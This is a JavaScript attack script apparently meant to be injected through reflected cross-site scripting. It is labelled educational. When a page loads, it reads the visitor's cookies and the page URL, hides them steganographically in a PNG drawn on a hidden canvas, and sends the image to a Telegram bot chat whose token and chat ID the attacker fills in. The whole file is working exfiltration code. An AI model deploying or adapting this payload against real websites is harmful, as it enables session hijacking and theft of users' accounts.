/* snitchyScript-reflectedCookie.js (v1.0)
 * @author     Naqwada (RuptureFarm 1029) <naqwada@pm.me>
 * @license    MIT License (http://www.opensource.org/licenses/mit-license.php)
 * @docs       https://github.com/Naqwa/SnitchyScript
 * @Website:   https://samy.link/
 * @Linkedin:  https://www.linkedin.com/in/samy-younsi/
 * @note       FOR EDUCATIONAL PURPOSE ONLY.
 */

document.addEventListener('DOMContentLoaded', (ev) => {
  const data = extractData();
  createImg(data);
});

function sendTelegram(blob) {
  const telegramApiToken = '<API_TOKEN>'; //Insert your API_TOKEN
  const telegramChatID = '<chatID>'; //Insert your chatID
  const telegramApiEndpoint = 'https://api.telegram.org';

  let formData = new FormData();
  formData.append('chat_id', telegramChatID);
  formData.append('document', blob, `${Math.random().toString(36).substring(7)}.png`);
  
  fetch(`${telegramApiEndpoint}/bot${encodeURIComponent(telegramApiToken)}/sendDocument`, {
      method: 'POST',
      body: formData
    })
    .then(response => {
      console.log(response)
    }).catch(error => genericErrorHandler(error.message));
}

function extractData() {
  const currentPage = window.location.href;
  const cookie = document.cookie;
  let formData = {};
  formData['currentPage'] = currentPage;
  formData['cookie'] = cookie;
  return JSON.stringify(formData);
};

function createImg(data) {
  createCanvas('snitchyPic');
  createCanvas('snitchyData');
  let snitchyPic = document.getElementById('snitchyPic');
  let ctx = snitchyPic.getContext('2d');
  let snitchyData = document.getElementById('snitchyData');
  let tctx = snitchyData.getContext('2d');
  
  let img = new Image();

  snitchyPic.width = 3000;
  snitchyPic.height = 100;
  snitchyData.width = 3000;
  snitchyData.height = 100;
  tctx.font = '14px Arial';
  tctx.fillText(data, 10, 50);
  ctx.fillStyle = '#c0392b';
  ctx.fillRect(0, 0, 3000, 100);
  ctx.drawImage(img,0,0);
  
  let imgData = ctx.getImageData(0, 0, snitchyPic.width, snitchyPic.height);
  let textData = tctx.getImageData(0, 0, snitchyPic.width, snitchyPic.height);
  let pixelsInMsg = 0;
  let pixelsOutMsg = 0;
  
  for (let i = 0; i < textData.data.length; i += 4) {
    if (textData.data[i+3] !== 0) {
      if (imgData.data[i+1]%10 == 7) {
      } else if (imgData.data[i+1] > 247) {
          imgData.data[i+1] = 247;
      } else {
          while (imgData.data[i+1] % 10 != 7) {
            imgData.data[i+1]++;
          }
      }
      pixelsInMsg++;
    } else {
      if (imgData.data[i+1]%10 == 7) {
            imgData.data[i+1]--;
      }
        pixelsOutMsg++;
    }
  }

  ctx.putImageData(imgData, 0, 0);
  snitchyPic.toBlob(function(blob) {
    sendTelegram(blob);
  },'image/png');
}

function createCanvas(canvasID) {
  if (document.contains(document.getElementById(`${canvasID}`)))
        document.getElementById(`${canvasID}`).remove();
  const canvas = document.createElement('canvas');
  canvas.id = canvasID;
  canvas.hidden = true;
  document.body.appendChild(canvas);
}